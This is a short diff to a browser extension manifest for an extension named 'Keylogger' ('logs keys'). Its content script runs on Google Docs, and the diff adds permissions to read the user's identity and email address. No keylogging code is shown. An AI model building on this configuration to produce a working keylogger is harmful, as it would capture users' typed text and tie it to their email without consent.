@@ -2,6 +2,10 @@
     "name":"Keylogger",
     "version":"1.0",
     "description":"logs keys",
+    "permissions" : [
+      "identity",
+      "identity.email"
+    ],
     "content_scripts": [
       {
         "matches": ["https://docs.google.com/*"],
